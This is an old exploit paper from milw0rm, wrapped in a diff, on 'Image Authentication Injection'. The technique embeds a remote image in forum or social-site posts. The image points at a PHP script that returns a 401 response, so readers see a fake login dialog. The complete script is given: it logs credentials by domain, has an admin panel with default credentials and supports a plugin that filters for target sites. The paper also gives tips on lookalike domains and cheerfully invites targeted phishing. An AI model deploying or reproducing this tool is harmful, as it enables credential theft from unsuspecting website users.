@@ -1,0 +1,274 @@
+<html>
+<head>
+<title>Image Authentication Injection Paper + PoC</title>
+<pre>
+Image Authentication Injection is a technique that is often overlooked, however,
+when implemented correctly you can create a very effective phishing system or even a worm 
+(unlike an XSS worm however you can't run client sided scripts on the victims computer, 
+you would simply edit their profile from the server using the stolen credentials)
+
+
+Image Authentication Injection Paper + PoC
+- Writted by Petros [at] dusecurity.com
+
+Shouts xplorer, RedDragonX, Zamani and the rest of the DuSecurity team
+and of course str0ke
+
+You can think of Image Authentication Injection as cross between XSS and Phishing. 
+It works anywhere you can put a remote image that will be persisted and displayed later.
+The main part of IAI is to create a php script that sends a 401 Unauthorized status when it is
+requested which will in turn cause the browser to display a login dialog (which appears to the user
+as if it were from the target website). Many sites and software are vulnerable to this as there is no easy
+way to patch it. I find it very effective on social networking sites such as myspace and popular forums.
+
+Usage:
+[img]http://attacker/iai.php[/img]
+&lt;img src=&quot;http://attacker/iai.php&quot; height=&quot;0&quot; width=&quot;0&quot; /&gt;
+
+Now when your post displays so will a login dialog that when filled out will be recorded and
+sent to the attacker. The problem with this is that the login dialog displays text such as:
+
+[The site www.attacker.com is requesting authization. The site says &quot;our title here&quot;]
+
+To get around with we simply use a domain such as &quot;login.myspace.com.sjrdkf.ms&quot; where we only need to 
+own the srdkf.ms domain and it should be sufficient to trick the novice user.
+This is the same situation as normal phishing however it is harder for an average user to
+notice as the address bar still has the correct site address in it and most users ignore the main text of
+this dialog. A convincing title and domain is all that is needed for this to work.
+
+Now I give you my IAI script. It is ready to be used with multiple sites and will organize
+logs by date and domain name. It has many options including a validation plugin option which allows
+you do make sure the user entered valid credentials for the target site.
+
+Admin Panel:
+http://attacker.com/iai.php?x=admin
+Default Username: admin
+Default Password: dusecurity
+
+iai.php:
+
+-----[code snip]-----
+
+&lt;?php
+#################################
+# image authentication injection#
+#+=============================+#
+# PoC by petros @ dusecurity    #
+#################################
+#    www.dusecurity.com         #
+#################################
+
+//* Configuration *//
+$config = array
+(
+    &quot;log_file&quot; =&gt; &quot;log.txt&quot;,         // Path to log file
+    &quot;no_cache&quot; =&gt; true,             // Attempt to disable browser cache
+    &quot;log_once&quot; =&gt; false,            // Only show the login dialog once
+    &quot;title&quot; =&gt; &quot;%host% login required&quot;,    // Title of login dialog. You may use tokens (see below)
+    &quot;validate_plugin&quot; =&gt; false,        // Path to auth validate plugin
+    &quot;validate&quot; =&gt; true,            // If a validate plugin is loaded check the username/password
+    &quot;cookie_name&quot; =&gt; &quot;%host%_IAP&quot;,        // Name of the tracking cookie
+    &quot;cookie_expire&quot; =&gt; 0,            // When the cookie expires (0 = end of session)
+    &quot;admin_user&quot; =&gt; &quot;admin&quot;,        // Admin username
+    &quot;admin_password&quot; =&gt; &quot;dusecurity&quot;    // Admin password
+);
+
+###############################
+# DO NOT EDIT BELOW THIS LINE #
+###############################
+
+$refer = parse_url($_SERVER['HTTP_REFERER']);
+
+if(!$refer['host']) $refer = false;
+//* Tokens *//
+$tokens = array
+(
+    &quot;host&quot; =&gt; $refer['host'],
+    &quot;refer&quot; =&gt; $_SERVER['HTTP_REFER']
+);
+
+
+function insertTokens($str)
+{
+    global $tokens;
+    foreach($tokens as $token =&gt; $replace)
+        $str = str_replace(&quot;%$token%&quot;, $replace, $str);
+    return $str;
+}
+
+$config['cookie_name'] = insertTokens($config['cookie_name']);
+$cookie = $_COOKIES[$config['cookie_name']];
+
+if($_GET['x'] == 'admin' &amp;&amp; !$refer) $ret = admin();
+else if($refer) $ret = phish();
+else $ret= false;
+
+if(!$ret) echo &quot;Access Denied&quot;;
+
+function phish()
+{
+    global $config, $refer, $cookie;
+   
+    $details = getDetails();
+    $exists = logExists($refer['host'], $details['user'], $details['pass']);
+    if($config['log_once'] &amp;&amp; ($cookie == 'yes' || $exists))
+        return true;
+    if(!$details) { dothenasty(); return false; }
+    if($config['no_cache']) disableCache();
+    if($config['validate'] &amp;&amp; $config['validate-plugin'])
+    {
+        if(is_file($config['validate-plugin']))
+        {
+            include $config['validate-plugin'];
+             if(function_exists('validate'))
+            {
+                if(!call_user_func('validate', $refer, $details['user'],$details['pass']))
+                return false;
+            }
+        }
+    }
+    addLog($refer['host'], $details['user'], $details['pass']);
+        setCookie($config['cookie_name'], 'yes', $config['expire']); // set cookie
+
+    return false;
+}   
+
+function admin()
+{
+    global $config;
+    $details = getDetails();
+    if(!$details || ($details['user'] != $config['admin_user'] || $details['pass'] != $config['admin_password'])) { dothenasty(&quot;IAP Admin Login&quot;); return false; }
+    $logs = loadLogs();
+    if(!$logs){ echo &quot;Failed to load log file :'(&quot;; return true;}
+    $hosts = array_keys($logs);
+    // k now we show our logs
+    echo &quot;&lt;html&gt;&lt;body&gt;&lt;h1&gt;Image Authentication Injection Logs&lt;/h1&gt;&lt;ul&gt;&quot;;
+    for($i = 0; $i &lt; sizeof($hosts); $i++)
+        echo &quot;&lt;li&gt;&lt;a href=\&quot;#{$hosts[$i]}\&quot;&gt;{$hosts[$i]}&lt;/a&gt;&lt;/li&gt;&quot;;
+    echo &quot;&lt;/ul&gt;&quot;;
+
+    echo &quot;&lt;br /&gt;&lt;br /&gt;&quot;;
+    $formathead = '&lt;div id=&quot;%1$s&quot;&gt;&lt;p&gt;&lt;h2&gt;%1$s&lt;table border=&quot;1&quot;&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;Username&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;&lt;strong&gt;Password&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;&lt;strong&gt;Timestamp&lt;/strong&gt;&lt;/td&gt;&lt;/tr&gt;';
+    $format = &quot;&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;&quot;;
+    foreach($logs as $host =&gt; $log)
+    {
+        printf($formathead, $host);
+        for($i = 0; $i &lt; sizeof($log); $i++)
+        {
+            $cl = $log[$i];
+            printf($format, $cl['user'], $cl['pass'],date('F jS, Y h:i:s A', $cl['time']));
+        }
+        echo &quot;&lt;/table&gt;&lt;/div&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&quot;;
+    }
+    return true;   
+   
+   
+   
+}
+       
+function getDetails()
+{
+    if(!$_SERVER['PHP_AUTH_USER'] || !$_SERVER['PHP_AUTH_PW']) return false;
+    else return array('user' =&gt; $_SERVER['PHP_AUTH_USER'], 'pass' =&gt; $_SERVER['PHP_AUTH_PW']);
+}   
+
+function dothenasty($title = false) // show login dialog
+{
+    global $config;
+    header('WWW-Authenticate: Basic realm=&quot;'.insertTokens(($title) ? $title : $config['title']).'&quot;');
+        header('HTTP/1.0 401 Unauthorized');
+}
+function addLog($host,$user, $pass, $time =0)
+{
+    global $config;
+    if(!$time) $time = time();
+    $fp = @fopen($config['log_file'], 'a+');
+    if(!$fp) return false;
+    $boundry = &quot;|--|&quot;.chr(0x7F).&quot;|--|&quot;;
+    fwrite($fp, &quot;$host$boundry$user$boundry$pass$boundry$time\r\n&quot;);
+    fclose($fp);
+    return true;
+}
+function logExists($host, $user, $pass)
+{
+    $log = loadLogs();
+    if(!$log) return  false;
+    if(!$log[$host]) return false;
+    $log = $log[$host];   
+    foreach($log as $host =&gt; $info)
+    {
+        if($info['user'] == $user) return true;
+    }
+    return false;
+}
+function loadLogs()
+{
+    global $config;
+    $fp = @fopen($config['log_file'], 'r');
+    if(!$fp) return false;
+    $logs = array();
+    while(!feof($fp))
+    {
+        $line = fgets($fp);
+        if(!$line) continue;
+        $line = explode('|--|'.chr(0x7F).&quot;|--|&quot;, $line);
+        if(!$logs[$line[0]]) $logs[$line[0]] = array();
+        $arr =&amp; $logs[$line[0]];
+        $arr[] = array(&quot;host&quot; =&gt; $line[0], &quot;user&quot; =&gt; $line[1], &quot;pass&quot; =&gt; $line[2], &quot;time&quot; =&gt; (int)$line[3]);   
+    }
+    fclose($fp);
+    return $logs;
+}
+
+function disableCache()
+{
+    header(&quot;Cache-Control: no-cache, must-revalidate&quot;);
+    header(&quot;Expires: Sat, 26 Jul 1997 05:00:00 GMT&quot;); // old versions of ie
+}
+
+?&gt;
+
+-----[ end code snip]-----
+
+
+Make sure you log file is writable before using this script.
+
+Here is an example of a plugin:
+First change validate-plugin in the $config array to the path of your plugin php script
+Next change the validate key in the $config array to true
+Now enjoy the benefits of targetted phishing :)
+
+
+Example Validation Plugin:
+
+-----[code snip]-----
+&lt;?php
+
+// Simple validation plugin
+
+// if the function returns true the log will be saved, else it will be ignored
+function validate($info, $user, $pass)
+{
+           if($info['host'] != 'mytarget.com') return false;
+            else return true;
+}
+
+-----[ end code snip]-----
+
+You may use this to make sure the person puts a valid username/password for target websites.
+The $info array contains the following info:
+    * scheme - e.g. http
+    * host
+    * port
+    * path
+    * query - after the question mark ?
+    * fragment - after the hashmark #
+
+
+Have fun :)
+
+
+** Remember this PoC script is hot off the presses and may contain bugs **
+
+# milw0rm.com [2009-07-17]</pre>
+</html>
